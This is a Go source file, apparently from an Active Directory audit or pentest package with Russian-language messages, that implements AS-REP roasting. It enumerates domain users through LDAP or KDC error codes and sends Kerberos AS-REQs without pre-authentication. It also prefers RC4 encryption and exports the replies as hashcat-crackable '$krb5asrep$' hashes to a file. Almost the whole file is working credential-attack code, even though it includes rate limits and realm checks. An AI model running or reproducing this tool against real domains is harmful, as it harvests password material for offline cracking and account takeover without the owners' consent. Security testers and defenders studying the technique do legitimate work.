package adscan

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"sort"
	"strings"
	"time"

	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/errorcode"
	"github.com/jcmturner/gokrb5/v8/iana/msgtype"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// NormalizeASREPUsers accepts account names, DOMAIN\user and user@realm.
// Foreign realms are rejected rather than sending names to the wrong KDC.
func NormalizeASREPUsers(users []string, realm string, limit int) ([]string, error) {
	if limit == 0 {
		limit = 5000
	}
	if limit < 1 || limit > 50000 {
		return nil, fmt.Errorf("лимит пользователей: 1–50000")
	}
	out, seen := []string{}, map[string]bool{}
	for _, raw := range users {
		user := strings.TrimSpace(raw)
		if user == "" {
			continue
		}
		if before, after, ok := strings.Cut(user, "\\"); ok {
			if !strings.EqualFold(before, realm) && !strings.EqualFold(before, strings.Split(realm, ".")[0]) {
				return nil, fmt.Errorf("пользователь %q относится к другому домену", raw)
			}
			user = after
		}
		if before, after, ok := strings.Cut(user, "@"); ok {
			if !strings.EqualFold(after, realm) {
				return nil, fmt.Errorf("пользователь %q относится к другому домену", raw)
			}
			user = before
		}
		if user == "" || len(user) > 256 || strings.ContainsAny(user, "/\\@:, \t\r\n\x00") {
			return nil, fmt.Errorf("некорректное имя пользователя %q", raw)
		}
		// Machine accounts end in $, which is valid in Kerberos and hashcat.
		key := strings.ToLower(user)
		if !seen[key] {
			if len(out) >= limit {
				return nil, fmt.Errorf("список превышает лимит %d пользователей", limit)
			}
			seen[key] = true
			out = append(out, user)
		}
	}
	sort.Slice(out, func(i, j int) bool { return strings.ToLower(out[i]) < strings.ToLower(out[j]) })
	return out, nil
}

// resolveASREPKDC uses configured/discovered DNS first, otherwise the system
// resolver. It does not change hosts, krb5.conf or the process environment.
func resolveASREPKDC(ctx context.Context, o AccessOptions) (string, error) {
	if o.Host != "" {
		if strings.ContainsAny(o.Host, "/\\ \t\r\n") {
			return "", fmt.Errorf("укажи один IP или DNS-хост KDC")
		}
		if net.ParseIP(o.Host) == nil && strings.Contains(o.Host, ":") {
			return "", fmt.Errorf("хост KDC указывается без порта")
		}
		return net.JoinHostPort(o.Host, "88"), nil
	}
	resolvers := []*net.Resolver{}
	for _, server := range o.DNS.Servers {
		resolvers = append(resolvers, dnsResolver(server))
	}
	if len(resolvers) == 0 {
		resolvers = append(resolvers, net.DefaultResolver)
	}
	var failures []string
	for i, resolver := range resolvers {
		server := "system resolver"
		if i < len(o.DNS.Servers) {
			server = o.DNS.Servers[i]
		}
		accessProgress(o, "AS-REP · DNS SRV _kerberos._tcp."+o.Domain+" · resolver="+server+" timeout=3s")
		queryCtx, cancel := context.WithTimeout(ctx, 3*time.Second)
		_, records, err := resolver.LookupSRV(queryCtx, "kerberos", "tcp", o.Domain+".")
		if err == nil {
			accessProgress(o, fmt.Sprintf("AS-REP · DNS SRV · resolver=%s records=%d", server, len(records)))
			for _, record := range records {
				if record.Target == "." || record.Port == 0 {
					continue
				}
				ips, lookupErr := resolver.LookupIPAddr(queryCtx, record.Target)
				if lookupErr == nil && len(ips) > 0 {
					cancel()
					return net.JoinHostPort(ips[0].IP.String(), fmt.Sprint(record.Port)), nil
				}
				if lookupErr != nil {
					failures = append(failures, "resolver="+server+" lookup="+record.Target+": "+lookupErr.Error())
				} else {
					failures = append(failures, "resolver="+server+" lookup="+record.Target+": IP-адреса не получены")
				}
			}
		}
		cancel()
		if ctx.Err() != nil {
			return "", ctx.Err()
		}
		if err != nil {
			failures = append(failures, "resolver="+server+": "+err.Error())
		}
	}
	return "", fmt.Errorf("KDC не найден через _kerberos._tcp.%s; проверь DNS или укажи хост: %s", o.Domain, strings.Join(failures, "; "))
}

func kerberosAccess(ctx context.Context, o AccessOptions) (AccessReport, error) {
	r := AccessReport{Host: o.Host, Mode: "asrep"}
	if err := ctx.Err(); err != nil {
		return r, err
	}
	o.Host = strings.TrimSpace(o.Host)
	o.Domain = strings.TrimSuffix(strings.ToLower(strings.TrimSpace(o.Domain)), ".")
	if o.Domain == "" && o.Host != "" {
		info := rootDSE(ctx, o.Host, 389)
		o.Domain = info.Domain
	}
	if o.Domain == "" && len(o.DNS.Domains) == 1 {
		o.Domain = o.DNS.Domains[0]
	}
	dns, err := ValidateDNSOptions(DNSOptions{Servers: o.DNS.Servers, Domains: []string{o.Domain}})
	if err != nil {
		return r, err
	}
	o.DNS = dns
	o.Domain = dns.Domains[0]
	users, err := NormalizeASREPUsers(o.Users, o.Domain, o.MaxObjects)
	if err != nil {
		return r, err
	}
	accessProgress(o, "AS-REP · поиск KDC · "+o.Domain)
	address, err := resolveASREPKDC(ctx, o)
	if err != nil {
		return r, err
	}
	r.Host, _, _ = net.SplitHostPort(address)
	r.Endpoint = "tcp://" + address
	accessProgress(o, "AS-REP · KDC "+address+" · домен "+o.Domain)
	if len(users) == 0 {
		accessProgress(o, "AS-REP · список имён пуст; собираю имена через LDAP")
		ldapOptions := o
		ldapOptions.Host = r.Host
		if ldapOptions.LDAPPort == 0 {
			ldapOptions.LDAPPort = 389
		}
		// An explicitly selected credential may collect names. The AS-REQs
		// themselves never contain target passwords or pre-authentication.
		c, closeFn, e := accessLDAP(ctx, ldapOptions, ldapOptions.LDAPPort, o.Credential.Username != "")
		if e != nil {
			return r, fmt.Errorf("имена не собраны: LDAP: %w; укажи список пользователей", e)
		}
		limit := o.MaxObjects
		if limit == 0 {
			limit = 5000
		}
		entries, e := accessSearch(ctx, c, baseDN(o.Domain), "(&(objectCategory=person)(objectClass=user))", []string{"sAMAccountName"}, limit)
		closeFn()
		for _, entry := range entries {
			users = append(users, entry.GetAttributeValue("sAMAccountName"))
		}
		if e != nil {
			r.add("asrep-users", "Сбор имён LDAP", "incomplete", "info", e.Error())
		}
		users, err = NormalizeASREPUsers(users, o.Domain, o.MaxObjects)
		if err != nil {
			return r, err
		}
		if len(users) == 0 {
			if e != nil {
				return r, fmt.Errorf("имена не собраны через LDAP: %w; укажи пользователей или @файл в настройках AS-REP", e)
			}
			return r, fmt.Errorf("имена не собраны через LDAP; укажи список пользователей")
		}
	}
	accessProgress(o, fmt.Sprintf("AS-REP · пользователей: %d · запросы без пароля и pre-auth", len(users)))
	return runASREPAt(ctx, address, o.Domain, users, o, r)
}

// runASREPAt sends AS-REQs without PA-ENC-TIMESTAMP or any password/key.
// RC4 is requested first for interoperability; AES is used if RC4 is disabled.
func runASREPAt(ctx context.Context, address, realm string, users []string, o AccessOptions, r AccessReport) (AccessReport, error) {
	if o.RPS <= 0 {
		o.RPS = 5
	}
	if o.Timeout <= 0 {
		o.Timeout = 5 * time.Second
	}
	interval := time.Second / time.Duration(o.RPS)
	var next time.Time
	waitRequest := func(requestCtx context.Context) error {
		if wait := time.Until(next); wait > 0 {
			timer := time.NewTimer(wait)
			defer timer.Stop()
			select {
			case <-requestCtx.Done():
				return requestCtx.Err()
			case <-timer.C:
			}
		}
		next = time.Now().Add(interval)
		return requestCtx.Err()
	}
	var hashes []string
	for _, user := range users {
		if o.Progress != nil {
			o.Progress("AS-REP · " + realm + " · " + user)
		}
		probeCtx, cancel := context.WithTimeout(ctx, o.Timeout)
		state, hash, err := probeASREP(probeCtx, address, realm, user, waitRequest)
		cancel()
		if ctx.Err() != nil {
			return finishASREP(r, hashes, o.ExportDir), ctx.Err()
		}
		if err != nil {
			r.add("asrep/"+user, "AS-REP: "+user, "error", "info", err.Error())
			accessProgress(o, "AS-REP · "+user+" · ошибка запроса к "+address+": "+err.Error())
			continue
		}
		if state == "confirmed" {
			accessProgress(o, "AS-REP · "+user+" · ответ без pre-auth получен")
			hashes = append(hashes, hash)
			r.add("asrep/"+user, "AS-REP без pre-auth: "+user, "confirmed", "high", "KDC "+address+" · "+strings.ToUpper(realm)+"\n"+hash+"\nОтвет получен без пароля; ключ сессии не расшифрован, вход по билету не выполнен.")
		} else {
			accessProgress(o, "AS-REP · "+user+" · "+hash)
			r.add("asrep/"+user, "AS-REP: "+user, state, "info", hash)
		}
	}
	return finishASREP(r, hashes, o.ExportDir), nil
}

func finishASREP(r AccessReport, hashes []string, dir string) AccessReport {
	if len(hashes) > 0 && dir != "" {
		path, err := exportASREPHashes(dir, hashes)
		if err != nil {
			r.add("asrep-export", "Экспорт AS-REP", "error", "info", err.Error())
		} else {
			r.Artifacts = append(r.Artifacts, path)
		}
	}
	return r
}

func probeASREP(ctx context.Context, address, realm, user string, beforeSend ...func(context.Context) error) (string, string, error) {
	realm = strings.ToUpper(realm)
	cfg := config.New()
	cfg.LibDefaults.NoAddresses = true
	principal := types.PrincipalName{NameType: nametype.KRB_NT_PRINCIPAL, NameString: []string{user}}
	for _, etypes := range [][]int32{{23}, {18, 17}} {
		cfg.LibDefaults.DefaultTktEnctypeIDs = etypes
		req, err := messages.NewASReqForTGT(realm, cfg, principal)
		if err != nil {
			return "", "", err
		}
		packet, err := req.Marshal()
		if err != nil {
			return "", "", err
		}
		if len(beforeSend) > 0 {
			if err := beforeSend[0](ctx); err != nil {
				return "", "", err
			}
		}
		reply, err := kerberosTCP(ctx, address, packet)
		if err != nil {
			return "", "", err
		}
		var rep messages.ASRep
		if err = rep.Unmarshal(reply); err != nil {
			var kerr messages.KRBError
			if !errors.As(err, &kerr) {
				return "", "", err
			}
			switch kerr.ErrorCode {
			case errorcode.KDC_ERR_ETYPE_NOSUPP:
				continue
			case errorcode.KDC_ERR_PREAUTH_REQUIRED:
				return "valid", "KDC подтвердил пользователя и требует pre-auth; AS-REP без пароля не выдан", nil
			case errorcode.KDC_ERR_C_PRINCIPAL_UNKNOWN:
				return "negative", "KDC: пользователь не найден в этом домене", nil
			case errorcode.KDC_ERR_CLIENT_REVOKED:
				return "valid-disabled", "KDC подтвердил пользователя; учётная запись отключена, заблокирована или отозвана", nil
			default:
				return "", "", kerr
			}
		}
		if rep.PVNO != 5 || rep.MsgType != msgtype.KRB_AS_REP || !strings.EqualFold(rep.CRealm, realm) || len(rep.CName.NameString) != 1 || !strings.EqualFold(rep.CName.NameString[0], user) || rep.Ticket.TktVNO != 5 || !strings.EqualFold(rep.Ticket.Realm, realm) || len(rep.Ticket.SName.NameString) != 2 || rep.Ticket.SName.NameString[0] != "krbtgt" || !strings.EqualFold(rep.Ticket.SName.NameString[1], realm) {
			return "", "", fmt.Errorf("AS-REP относится к другому пользователю/realm или не содержит TGT")
		}
		if !containsEtype(etypes, rep.EncPart.EType) {
			return "", "", fmt.Errorf("KDC вернул незапрошенный etype %d", rep.EncPart.EType)
		}
		hash, err := asrepHash(rep)
		if err != nil {
			return "", "", err
		}
		return "confirmed", hash, nil
	}
	return "", "", fmt.Errorf("KDC не поддерживает запрошенные RC4/AES типы шифрования")
}

func asrepHash(rep messages.ASRep) (string, error) {
	cipher := rep.EncPart.Cipher
	if len(rep.CName.NameString) != 1 || len(cipher) < 32 {
		return "", fmt.Errorf("неполный AS-REP ciphertext")
	}
	user, realm := rep.CName.NameString[0], rep.CRealm
	switch rep.EncPart.EType {
	case 23:
		return fmt.Sprintf("$krb5asrep$23$%s@%s:%s$%s", user, realm, hex.EncodeToString(cipher[:16]), hex.EncodeToString(cipher[16:])), nil
	case 17, 18:
		return fmt.Sprintf("$krb5asrep$%d$%s$%s$%s$%s", rep.EncPart.EType, user, realm, hex.EncodeToString(cipher[len(cipher)-12:]), hex.EncodeToString(cipher[:len(cipher)-12])), nil
	default:
		return "", fmt.Errorf("AS-REP etype %d не поддерживается для экспорта", rep.EncPart.EType)
	}
}

// TCP record lengths are bounded before allocation. Parent cancellation closes
// the connection, including while waiting for a partial four-byte record header.
func kerberosTCP(ctx context.Context, address string, request []byte) (reply []byte, err error) {
	started := time.Now()
	stage := "KDC TCP connect " + address
	defer func() { err = accessFailure(stage, started, err) }()
	conn, err := (&net.Dialer{}).DialContext(ctx, "tcp", address)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	stop := context.AfterFunc(ctx, func() { conn.Close() })
	defer stop()
	if deadline, ok := ctx.Deadline(); ok {
		_ = conn.SetDeadline(deadline)
	}
	frame := make([]byte, 4+len(request))
	binary.BigEndian.PutUint32(frame, uint32(len(request)))
	copy(frame[4:], request)
	stage = "KDC TCP send request " + address
	if _, err = io.Copy(conn, bytes.NewReader(frame)); err != nil {
		return nil, err
	}
	var header [4]byte
	stage = "KDC TCP read record length " + address
	if _, err = io.ReadFull(conn, header[:]); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(header[:])
	if n == 0 || n > 1<<20 {
		return nil, fmt.Errorf("некорректная длина KDC-ответа: %d", n)
	}
	stage = fmt.Sprintf("KDC TCP read response %s expected_bytes=%d", address, n)
	reply = make([]byte, int(n))
	_, err = io.ReadFull(conn, reply)
	return reply, err
}

func containsEtype(etypes []int32, etype int32) bool {
	for _, candidate := range etypes {
		if candidate == etype {
			return true
		}
	}
	return false
}

func exportASREPHashes(dir string, hashes []string) (string, error) {
	return exportKerberosHashes(dir, "asrep", hashes)
}

func exportKerberosHashes(dir, prefix string, hashes []string) (string, error) {
	if err := os.MkdirAll(dir, 0700); err != nil {
		return "", err
	}
	f, err := os.CreateTemp(dir, prefix+"-*.hashcat")
	if err != nil {
		return "", err
	}
	name := f.Name()
	if err = f.Chmod(0600); err == nil {
		_, err = io.WriteString(f, strings.Join(hashes, "\n")+"\n")
	}
	closeErr := f.Close()
	if err == nil {
		err = closeErr
	}
	if err != nil {
		_ = os.Remove(name)
		return "", err
	}
	return name, nil
}
